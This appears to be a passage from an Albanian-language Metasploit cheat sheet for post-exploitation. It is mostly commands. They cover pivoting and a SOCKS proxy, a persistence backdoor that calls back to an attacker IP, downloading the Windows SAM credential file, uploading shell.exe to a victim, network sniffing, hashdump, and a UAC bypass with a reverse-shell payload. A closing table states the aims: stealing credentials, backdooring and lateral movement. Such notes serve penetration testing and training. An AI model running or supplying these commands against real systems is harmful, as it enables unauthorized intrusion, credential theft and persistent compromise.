
**Pivoting (route add)**

Nëse ke akses në një makinë të brendshme, mund të përdorësh Metasploit për të pivotuar në makina të tjera:

```bash
run autoroute -s 192.168.1.0/24
# ose në msfconsole
route add 192.168.1.0 255.255.255.0 1

# Pastaj përdor db_nmap ose socks_proxy për të eksploruar rrjetin tjetër
```

**Socks4a Proxy për Lëvizje në Rrjet të Brendshëm**

```bash
use auxiliary/server/socks4a
set SRVPORT 1080
run

# Pastaj në /etc/proxychains.conf:
socks4 127.0.0.1 1080

```

**Persistence**

```
run persistence -U -i 5 -p 4444 -r <your_IP>
```

**Upload/Download Files**

```bash
# Nga Meterpreter
download C:\\\\\\\\Windows\\\\\\\\repair\\\\\\\\sam
upload shell.exe C:\\\\\\\\Users\\\\\\\\Public\\\\\\\\shell.exe
```

**Debug Command**

```bash
set Verbose true      # Tregon më shumë informacion gjatë ekzekutimit
set EXITFUNC thread   # Përdoret që procesi të mos mbyllet kur shell mbaron
```

**Sniffing me Metasploit**

```
use auxiliary/sniffer/psnuffle
set INTERFACE eth0
run
```

**Post Exploitation Enumeration (Windows/Linux)**

```bash
use post/windows/gather/hashdump
use post/multi/recon/local_exploit_suggester
use post/linux/gather/enum_system
```

**Bypass UAC në Windows**

```bash
use exploit/windows/local/bypassuac
set SESSION <id>
set PAYLOAD windows/meterpreter/reverse_tcp
```

:

|Fusha|Pse është e rëndësishme|
|---|---|
|🔐 Mimikatz/kiwi|Për të marrë kredenciale nga memoria|
|🧱 Pivoting|Lëvizje laterale në rrjete të brendshme|
|🧭 Socks Proxy|Përdorim me proxychains për skanime|
|🔁 Persistence|Krijimi i backdoor pas komprometimit|
|📥 Upload/Download|Të sjellësh dhe çosh file te viktima|
|🎯 Options & Targets|Bazat për konfigurim korrekt të modules|
|🔎 Sniffing|Për mbledhje të informacionit në rrjet|
|🧨 Bypass UAC|Për eskalim privilegjesh në Windows|
|🧰 Debug options|Kontroll më i mirë gjatë testimeve|
|📋 Post Modules|Enumerim pas suksesit të shell-it|